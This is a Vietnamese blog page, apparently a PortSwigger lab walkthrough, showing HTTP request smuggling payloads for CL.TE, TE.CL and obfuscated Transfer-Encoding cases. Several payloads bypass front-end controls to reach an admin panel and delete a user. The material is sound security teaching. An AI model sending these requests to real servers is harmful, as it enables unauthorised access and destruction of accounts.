@@ -1,0 +1,796 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+  <!-- 元数据 -->
+  <meta charset="utf-8">
+  <link rel="canonical" href="https://rayinaw.github.io/2022/12/02/hrs-portswigger/">
+  <link rel="icon" href="https://i.pinimg.com/564x/07/87/e7/0787e75ed249720cdb85f6918c609f61.jpg">
+  
+  <title>Portswigger HTTP Request smuggling | Rayinaw</title>
+  <meta name="author" content="Rayinaw">
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="robots" content="index,follow">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="format-detection" content="telphone=no, email=no">
+  
+    <meta name="keywords" content="HRS, Portswigger">
+  
+  <meta name="description" content="Portswigger: HTTP Request smuggling:HTTP request smuggling, basic CL.TE vulnerability  Yêu cầu: Làm cho server trả về lỗi “Unrecognized method GPOST”.Gửi yêu cầu đầu tiên đến server: 1234567891011POST">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Portswigger HTTP Request smuggling">
+<meta property="og:url" content="https://rayinaw.github.io/2022/12/02/HRS-PortSwigger/index.html">
+<meta property="og:site_name" content="Rayinaw">
+<meta property="og:description" content="Portswigger: HTTP Request smuggling:HTTP request smuggling, basic CL.TE vulnerability  Yêu cầu: Làm cho server trả về lỗi “Unrecognized method GPOST”.Gửi yêu cầu đầu tiên đến server: 1234567891011POST">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://i.pinimg.com/564x/07/87/e7/0787e75ed249720cdb85f6918c609f61.jpg">
+<meta property="article:published_time" content="2022-12-02T15:22:15.000Z">
+<meta property="article:modified_time" content="2024-09-05T07:16:54.213Z">
+<meta property="article:author" content="Rayinaw">
+<meta property="article:tag" content="HRS">
+<meta property="article:tag" content="Portswigger">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.pinimg.com/564x/07/87/e7/0787e75ed249720cdb85f6918c609f61.jpg">
+  
+  <!-- 站点验证相关 -->
+  
+    
+      <meta name="google-site-verification" content="aI3yWWy1IiiYpszN7ZglYDMHV2_A2mRNPujhnK6q8uA">
+    
+    
+    
+  
+  <!-- 样式表文件 -->
+  <link rel="stylesheet" id="kratos-css" href="/css/kratosr.min.css" media="all">
+  
+    <link rel="stylesheet" id="darkmode-css" href="/css/kr-color-dark.min.css" media="(prefers-color-scheme: dark)">
+    <script src="/js/kr-dark.min.js"></script>
+  
+  
+    <link rel="stylesheet" id="highlight-css" href="/css/highlight/night.min.css" media="all">
+  
+  
+  <link rel="stylesheet" id="fontawe-css" href="/vendors/font-awesome@4.7.0/css/font-awesome.min.css" media="all">
+  <link rel="stylesheet" id="nprogress-css" href="/vendors/nprogress@0.2.0/nprogress.css" media="all">
+  
+  
+    <link rel="stylesheet" href="/vendors/aplayer@1.10.1/dist/APlayer.min.css">
+  
+  
+    <link rel="stylesheet" href="/vendors/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
+  
+  <!-- 不得不预先加载的一些JS文件 -->
+  <script src="/vendors/jquery@3.6.0/dist/jquery.min.js"></script>
+  
+    <script src="/vendors/qrcode_js@1.0.0/qrcode.min.js"></script>
+  
+  
+  <style>
+    
+      .kratos-cover.kratos-cover-2 {
+        background-image: url('/images/banner.webp');
+      }
+    
+    
+      @media(min-width:768px) {
+        body.custom-background {
+          background-image: url('/images/bg.webp');
+        }
+      }
+    
+  </style>
+  
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/rss2.xml" title="Rayinaw" type="application/rss+xml">
+</head>
+
+
+    <body class="custom-background">
+        <div id="kratos-wrapper">
+    <div id="kratos-page">
+        <div id="kratos-header">
+            <header id="kratos-desktop-topnav" class="kratos-topnav">
+                <div class="container">
+                    <div class="nav-header">
+                        <nav id="kratos-menu-wrap">
+                            <ul id="kratos-primary-menu" class="sf-menu">
+                                
+                                                
+                                                    
+                                                        
+                                                                <li>
+                                                                    <a href="/">
+                                                                        <i class="fa fa-home"></i>Trang chủ
+                                                                    </a>
+                                                                </li>
+                                                                
+                                                                    
+                                                        
+                                                                <li>
+                                                                    <a href="/archives/">
+                                                                        <i class="fa fa-book"></i>Kho lưu trữ
+                                                                    </a>
+                                                                </li>
+                                                                
+                                                                    
+                                                        
+                                                                <li>
+                                                                    <a href="/about/">
+                                                                        <i class="fa fa-paper-plane"></i>Về mình
+                                                                    </a>
+                                                                </li>
+                                                                
+                                                                    
+                                                                        
+                            </ul>
+                        </nav>
+                    </div>
+                </div>
+            </header>
+            <header id="kratos-mobile-topnav" class="kratos-topnav">
+                <div class="container">
+                    <div class="color-logo">
+                        <a href="/">
+                            Rayinaw
+                        </a>
+                    </div>
+                    <div class="nav-toggle">
+                        <a class="kratos-nav-toggle js-kratos-nav-toggle">
+                            <i></i>
+                        </a>
+                    </div>
+                </div>
+            </header>
+        </div>
+        <div class="kratos-start kratos-hero-2">
+            <!-- <div class="kratos-overlay"></div> -->
+            <div class="kratos-cover kratos-cover-2 text-center">
+                <div class="desc desc2 animate-box">
+                    <a href="/">
+                        <h2>
+                            Rayinaw
+                        </h2> <br>
+                        <span>Nơi mình ghi chú lại những thứ đã học.</span>
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <div id="kratos-blog-post">
+            <div class="container">
+                <div id="main" class="row">
+                    
+
+        
+
+            <section class="col-md-8">
+
+        
+
+            <article itemscope itemtype="https://schema.org/Article">
+    
+    <link itemprop="mainEntityOfPage" href="https://rayinaw.github.io/2022/12/02/HRS-PortSwigger/">
+    <div class="kratos-hentry kratos-post-inner clearfix">
+        <header class="kratos-entry-header">
+            
+                <h1 class="kratos-entry-title text-center" itemprop="name headline">Portswigger HTTP Request smuggling</h1>
+            
+            
+            <ul class="kratos-post-meta text-center">
+                <li><time datetime="2022-12-02T15:22:15.000Z" itemprop="datePublished"><i class="fa fa-calendar"></i> 2022-12-02</time></li>
+                <li itemprop="author" itemscope itemtype="https://schema.org/Person">
+                    <i class="fa fa-user"></i> Tác giả <span itemprop="name">Rayinaw</span>
+                </li>
+                <li>
+                    <i class="fa fa-edit"></i> 
+                    
+                    
+                        ~17.36K
+                    
+                    từ
+                </li>
+                
+            </ul>
+        </header>
+        <div class="kratos-post-content">
+            
+            <div id="expire-alert" class="alert alert-warning hidden" role="alert">
+                <div class="icon"><i class="fa fa-warning"></i></div>
+                <div class="text"><p>Bài viết này được chỉnh sửa lần cuối vào <time datetime="1725520614213"></time> trước, và có thể cần cập nhật。</p></div>
+            </div>
+            
+            
+            
+            <hr>
+            <div itemprop="articleBody"><h2 id="Portswigger-HTTP-Request-smuggling"><a href="#Portswigger-HTTP-Request-smuggling" class="headerlink" title="Portswigger: HTTP Request smuggling:"></a>Portswigger: HTTP Request smuggling:</h2><h3 id="HTTP-request-smuggling-basic-CL-TE-vulnerability"><a href="#HTTP-request-smuggling-basic-CL-TE-vulnerability" class="headerlink" title="HTTP request smuggling, basic CL.TE vulnerability"></a>HTTP request smuggling, basic CL.TE vulnerability</h3><img width="620" alt="image" src="https://github.com/user-attachments/assets/2be597eb-3e17-4f72-ad85-5f20c67d62b7">
+
+<p>Yêu cầu: Làm cho server trả về lỗi “Unrecognized method GPOST”.<br>Gửi yêu cầu đầu tiên đến server:</p>
+<figure class="highlight h"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">0</span>a7d003e03334d1dc24b5a4f002f0071.web-security-academy.net</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: <span class="number">10</span></span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line"><span class="number">3</span></span><br><span class="line">aaa</span><br><span class="line"><span class="number">0</span></span><br><span class="line"></span><br><span class="line">G</span><br></pre></td></tr></table></figure>
+<p>Sau đó gửi một yêu cầu bình thường và lỗi sẽ triggered.</p>
+<figure class="highlight h"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">0</span>a7d003e03334d1dc24b5a4f002f0071.web-security-academy.net</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
+
+<img width="719" alt="image" src="https://github.com/user-attachments/assets/e33bead5-dc94-4c9c-a75c-eaf7e5da9e6b">
+
+<img width="716" alt="image" src="https://github.com/user-attachments/assets/f8444f11-8e3b-45e3-a033-50bdfc3f8666">
+
+<h3 id="HTTP-request-smuggling-basic-TE-CL-vulnerability"><a href="#HTTP-request-smuggling-basic-TE-CL-vulnerability" class="headerlink" title="HTTP request smuggling, basic TE.CL vulnerability"></a>HTTP request smuggling, basic TE.CL vulnerability</h3><p>Cũng là kích hoạt lỗi “Unrecognized method GPOST”. Back-end không hỗ trợ chunked encoding nên sẽ là dạng TE.CL</p>
+<p>Uncheck update Content-Length:<br><img width="406" alt="image" src="https://github.com/user-attachments/assets/c54f3688-26c5-4c18-ad83-6167eae4ba16"></p>
+<p>Gửi yêu cầu sau đến server sau đó gửi một request tùy ý.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 0aa800e204010a8f810e48bf008000ff.web-security-academy.net</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Content-Length: 4</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">5d</span><br><span class="line">GPOST / HTTP/1.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 15</span><br><span class="line"></span><br><span class="line">aaaa</span><br><span class="line">0</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<img width="715" alt="image" src="https://github.com/user-attachments/assets/209c3e4e-e0bc-485c-a26a-5753cc243e90">
+<img width="506" alt="image" src="https://github.com/user-attachments/assets/541a19ed-e25f-422d-a295-fa470cd5abec">
+
+<p>Giải thích:</p>
+<ul>
+<li>Một yêu cầu POST sẽ hợp lệ nếu có trường <code>Content-Type</code> hoặc <code>Content-Length</code> hoặc <code>Transfer-Encoding</code>, ở đây mình thêm trường <code>Content-Type: application/x-www-form-urlencoded</code> để tránh đôi khi có lỗi nó không xét 2 cái kia, không thêm cũng được không quan trọng.</li>
+<li>Ở đây như đề bài nói máy chủ back-end không hỗ trợ <code>Transfer-Encoding: chunked</code> nên chúng ta có thể để máy chủ front-end phân tích <code>Transfer-Encoding: chunked</code> và để cho máy chủ back-end phân tích <code>Content-Length</code>.</li>
+<li>5d hex &#x3D; 93 decimal &#x3D; dòng 1 + \r\n + d2 + \r\n +d3 +\r\n + d4 + \r\n + aaaa</li>
+<li>Kết thúc chuỗi là số 0 và xuống dòng để máy chủ front-end phân tích <code>Transfer-Encoding: chunked</code> hợp lệ.</li>
+<li>Sau khi máy chủ front-end phân tích, nó thõa mãn và gửi đến back-end. Máy chủ back-end chỉ phân tích trường <code>Content-Length</code> và ở đây chỉ bằng 4 và bằng 5d + \r + \n nên phần còn lại sẽ là một yêu cầu mới.<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GPOST / HTTP/1.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 15</span><br><span class="line"></span><br><span class="line">aaaa</span><br><span class="line">0</span><br></pre></td></tr></table></figure></li>
+<li>Bây giờ nếu chúng ta gửi tiếp một yêu cầu nữa cùng chung một connection TCP nó sẽ trigger lỗi <code>Unrecognized method GPOST</code>. Và để được như vậy thì chúng ta cần set thêm trường <code>Connection: Keep-Alive</code> hoặc <code>Connection: Pipelining</code> tuy nhiên với HTTP&#x2F;1.1 thì <code>Connection: Keep-Alive</code> luôn được bật trừ khi máy chủ set là close nên chúng ta cũng không cần thiết thêm vào (thêm cho chắc :P).</li>
+</ul>
+<h3 id="HTTP-request-smuggling-obfuscating-the-TE-header"><a href="#HTTP-request-smuggling-obfuscating-the-TE-header" class="headerlink" title="HTTP request smuggling, obfuscating the TE header"></a>HTTP request smuggling, obfuscating the TE header</h3><p>Ở đây ta sẽ gửi một cái TE hợp lệ và một cái TE không hợp lệ để obfuscate server. Gửi 2 lần yêu cầu sau để trigger lỗi.</p>
+<figure class="highlight h"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">0</span>a4c0057043adfc481d61c2b00c90078.web-security-academy.net</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Content-length: <span class="number">4</span></span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Transfer-Encoding: xxx</span><br><span class="line"></span><br><span class="line"><span class="number">5</span>d</span><br><span class="line">GPOST / HTTP/<span class="number">1.1</span></span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: <span class="number">15</span></span><br><span class="line"></span><br><span class="line">aaaa</span><br><span class="line"><span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<img width="721" alt="image" src="https://github.com/user-attachments/assets/f3cd69e8-713c-4b84-a7cb-fdeee3aed683">
+
+<h3 id="HTTP-request-smuggling-confirming-a-CL-TE-vulnerability-via-differential-responses"><a href="#HTTP-request-smuggling-confirming-a-CL-TE-vulnerability-via-differential-responses" class="headerlink" title="HTTP request smuggling, confirming a CL.TE vulnerability via differential responses"></a>HTTP request smuggling, confirming a CL.TE vulnerability via differential responses</h3><p>Bài này front-end chỉ xử lý <code>Content-Length</code> –&gt; CL.TE (chưa chắc nma theo đề thì z).<br>Yêu cầu là đính chính lại nó dính lỗi CL.TE bằng cách để yêu cầu thứ 2 là một yêu cầu trả về lỗi <code>404 not found</code>.</p>
+<p>Ở phần thứ 2 của request, ta có 2 cách để tạo một request hợp lệ:</p>
+<ul>
+<li>Gửi một POST request, khi đó nếu có request khác gửi đến thì nó sẽ gắn vào phần body –&gt; không bị lỗi 400<figure class="highlight h"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">0</span>a72005104370d94c026137d00880058.web-security-academy.net</span><br><span class="line">Connection: close</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Content-Length: <span class="number">96</span></span><br><span class="line"></span><br><span class="line"><span class="number">0</span></span><br><span class="line"></span><br><span class="line">POST /aaa HTTP/<span class="number">1.1</span></span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: <span class="number">15</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
+<li>Cách 2 là sử dụng <code>X-Ignore: abc</code>, khi này phần sau request sẽ được gắn vào trường X-Ignore header và không gây ra lỗi 400.<figure class="highlight h"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/<span class="number">1.1</span></span><br><span class="line">Host: YOUR-LAB-ID.web-security-academy.net</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: <span class="number">35</span></span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line"><span class="number">0</span></span><br><span class="line"></span><br><span class="line">GET /<span class="number">404</span> HTTP/<span class="number">1.1</span></span><br><span class="line">X-Ignore: X</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p>Gửi request với payload trên, sau đó gửi một request bất kỳ để solve lab.</p>
+<img width="720" alt="image" src="https://github.com/user-attachments/assets/54151a7d-ccab-416b-b7c3-90e079f1d926">
+
+<img width="715" alt="image" src="https://github.com/user-attachments/assets/f45992eb-d270-4d4d-bf86-f01419fe63d2">
+
+<h3 id="HTTP-request-smuggling-confirming-a-TE-CL-vulnerability-via-differential-responses"><a href="#HTTP-request-smuggling-confirming-a-TE-CL-vulnerability-via-differential-responses" class="headerlink" title="HTTP request smuggling, confirming a TE.CL vulnerability via differential responses"></a>HTTP request smuggling, confirming a TE.CL vulnerability via differential responses</h3><ul>
+<li>Back-end server doesn’t support chunked encoding</li>
+<li>Triggering 404 Not Found response</li>
+</ul>
+<p>Gửi 2 lần request sau:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 0ab5007903cff13dc0551c8b0038003d.web-security-academy.net</span><br><span class="line">Connection: Pipelining</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Content-Length: 4</span><br><span class="line"></span><br><span class="line">5F</span><br><span class="line">POST /aaa HTTP/1.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 10</span><br><span class="line"></span><br><span class="line">aaaa</span><br><span class="line">0</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="Exploiting-HTTP-request-smuggling-to-bypass-front-end-security-controls-CL-TE-vulnerability"><a href="#Exploiting-HTTP-request-smuggling-to-bypass-front-end-security-controls-CL-TE-vulnerability" class="headerlink" title="Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability"></a>Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability</h3><p>Gửi 2 lần request sau:</p>
+<figure class="highlight h"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">0</span>a33008a039b2e88c01e9186008400ec.web-security-academy.net</span><br><span class="line">Connection: Pipelining</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Content-Length: <span class="number">107</span></span><br><span class="line"></span><br><span class="line"><span class="number">0</span></span><br><span class="line"></span><br><span class="line">POST /admin HTTP/<span class="number">1.1</span></span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: <span class="number">100</span></span><br><span class="line"></span><br><span class="line">aaaa</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>Kết quả trả về là <code>Admin interface only available to local users</code>, vậy là chúng ta cần truy cập đến admin page với host là localhost. Vì hiện tại server sẽ mặc định set cho ta host là <code>0a33008a039b2e88c01e9186008400ec.web-security-academy.net</code></p>
+<figure class="highlight h"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">0</span>a33008a039b2e88c01e9186008400ec.web-security-academy.net</span><br><span class="line">Connection: Pipelining</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Content-Length: <span class="number">124</span></span><br><span class="line"></span><br><span class="line"><span class="number">0</span></span><br><span class="line"></span><br><span class="line">POST /admin HTTP/<span class="number">1.1</span></span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Host: localhost</span><br><span class="line">Content-Length: <span class="number">100</span></span><br><span class="line"></span><br><span class="line">aaaa</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>Payload cuối cùng:</p>
+<figure class="highlight h"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">0</span>a33008a039b2e88c01e9186008400ec.web-security-academy.net</span><br><span class="line">Connection: Pipelining</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Content-Length: <span class="number">124</span></span><br><span class="line"></span><br><span class="line"><span class="number">0</span></span><br><span class="line"></span><br><span class="line">POST /admin/delete?username=carlos HTTP/<span class="number">1.1</span></span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Host: localhost</span><br><span class="line">Content-Length: <span class="number">100</span></span><br><span class="line"></span><br><span class="line">aaaa</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h3 id="Exploiting-HTTP-request-smuggling-to-bypass-front-end-security-controls-TE-CL-vulnerability"><a href="#Exploiting-HTTP-request-smuggling-to-bypass-front-end-security-controls-TE-CL-vulnerability" class="headerlink" title="Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability"></a>Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability</h3><img width="610" alt="image" src="https://github.com/user-attachments/assets/dfd0c00a-938d-422b-98c7-355b07c9c30f">
+
+<p>back-end server doesn’t support chunked encoding nên chúng ta có thể nghĩ đến TE.CL</p>
+<p>Gửi 2 lần request sau:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 0ad9007b0481dacfc155c02800b5002d.web-security-academy.net</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Content-Length: 4</span><br><span class="line"></span><br><span class="line">62</span><br><span class="line">POST /admin HTTP/1.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 100</span><br><span class="line"></span><br><span class="line">aaaa</span><br><span class="line">0</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<img width="826" alt="image" src="https://github.com/user-attachments/assets/56c2c5eb-e2b5-4796-b002-37ee3eb56282">
+
+<p>Phản hồi thứ 2 trả về <code>Admin interface only available to local users</code>, để bypass ta có thể thử thêm trường <code>Host: localhost</code></p>
+<p>Gửi 2 lần request sau để solve lab này.</p>
+<figure class="highlight h"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">0</span>a4800ce048b085f8658a298003e0031.web-security-academy.net</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Content-Length: <span class="number">4</span></span><br><span class="line"></span><br><span class="line"><span class="number">8</span>A</span><br><span class="line">POST /admin/delete?username=carlos HTTP/<span class="number">1.1</span></span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Host: localhost</span><br><span class="line">Content-Length: <span class="number">100</span></span><br><span class="line"></span><br><span class="line">aaaa</span><br><span class="line"><span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<img width="831" alt="image" src="https://github.com/user-attachments/assets/ac27a873-8a50-43d9-9365-5ddf3c5cb346">
+
+<img width="825" alt="image" src="https://github.com/user-attachments/assets/2f8503da-dd9c-464a-b020-6d6a33ec1ba7">
+
+<img width="916" alt="image" src="https://github.com/user-attachments/assets/862be7fb-42b2-41a8-ba53-7b698a742c30">
+
+
+<h3 id="Exploiting-HTTP-request-smuggling-to-reveal-front-end-request-rewriting"><a href="#Exploiting-HTTP-request-smuggling-to-reveal-front-end-request-rewriting" class="headerlink" title="Exploiting HTTP request smuggling to reveal front-end request rewriting"></a>Exploiting HTTP request smuggling to reveal front-end request rewriting</h3><p>Front-end server doesn’t support chunked encoding –&gt; ý tưởng là CL.TE</p>
+<ul>
+<li>Bài này tác giả bảo là có trường set IP cho client tương tự như <code>X-Forwarded-For</code> nên mình đã nghĩ đến <code>X-Real-IP</code> tuy nhiên gửi mãi không thấy kết quả gì. Hóa ra ý tác giả muốn bảo ở đây là thằng <code>X-*-IP</code> phần trong dấu * có thể tùy ý nên chúng ta cần tìm phần này. Để tìm được điều này chúng ta cần lợi dụng trường search.</li>
+</ul>
+<p>Gửi 2 lần yêu cầu sau:</p>
+<figure class="highlight h"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">0</span>abe003e032e7439c04debfe00e5002f.web-security-academy.net</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Content-Length: <span class="number">150</span></span><br><span class="line"></span><br><span class="line"><span class="number">0</span></span><br><span class="line"></span><br><span class="line">POST / HTTP/<span class="number">1.1</span></span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: <span class="number">100</span></span><br><span class="line">X-Real-IP: <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">search=test</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>Phần yêu cầu sau sẽ được gắn vào sau thằng test và mình có thể thấy được nhờ trường search. Kết quả trả về như sau:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0 search results for &#x27;test GET / HTTP/1.1 X-wvIzjI-Ip: 113.161.69.230 Host: 0abe003e032e7439c04debfe00e5002f.w&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>X-*-Ip mỗi người mỗi khác nên các bạn phải tự tìm lấy nhé.</p>
+<p>Sau khi biết được cái này rồi thì rất đơn giản, chúng ta chỉ cần set IP là 127.0.0.1 để truy cập vào admin panel.</p>
